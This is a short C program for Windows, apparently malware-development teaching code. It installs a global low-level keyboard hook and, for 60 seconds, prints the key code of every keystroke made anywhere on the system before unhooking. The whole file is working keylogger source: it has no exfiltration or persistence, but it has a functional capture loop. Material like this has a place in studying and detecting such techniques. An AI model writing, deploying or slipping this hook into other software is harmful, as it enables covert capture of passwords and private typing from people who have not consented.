#include <windows.h>
#include <stdio.h>

#define MONITOR_TIME   60000 // monitor keyboard keystrokes for 60 seconds

// global hook handle variable
HHOOK g_hKeyboardHook      = NULL;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

// the callback function that will be executed whenever the user presses a key
LRESULT HookCallback(int nCode, WPARAM wParam, LPARAM lParam){

    if (wParam == WM_KEYDOWN){
        // lParam is the pointer to the struct containing the data needed
        // so we cast and assign it to kdbStruct.
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

        printf("%c", kbdStruct.vkCode);
    }
    
    // moving to the next hook in the hook chain
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL KeyboardClicksLogger(){
    MSG         Msg         = { 0 };

    // installing hook 
    g_hKeyboardHook = SetWindowsHookExW(
        WH_KEYBOARD_LL,
        (HOOKPROC)HookCallback,
        NULL,  
        NULL
    );

    if (!g_hKeyboardHook) {
        printf("[!] SetWindowsHookExW Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[*] Output: ");

    // process unhandled events
    while (GetMessageW(&Msg, NULL, NULL, NULL)) {
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }
    
    return TRUE;
}

int main() {
    HANDLE  hThread         = NULL;
    DWORD   dwThreadId      = NULL;

    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)KeyboardClicksLogger, NULL, NULL, &dwThreadId);
    if (hThread) {
        printf("[i] Thread %d Is Created To Monitor Keyboard Clicks For %d Seconds\n", dwThreadId, (MONITOR_TIME / 1000));
        WaitForSingleObject(hThread, MONITOR_TIME);
    }

    if (g_hKeyboardHook && !UnhookWindowsHookEx(g_hKeyboardHook)) {
        printf("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
    }

    return 0;
}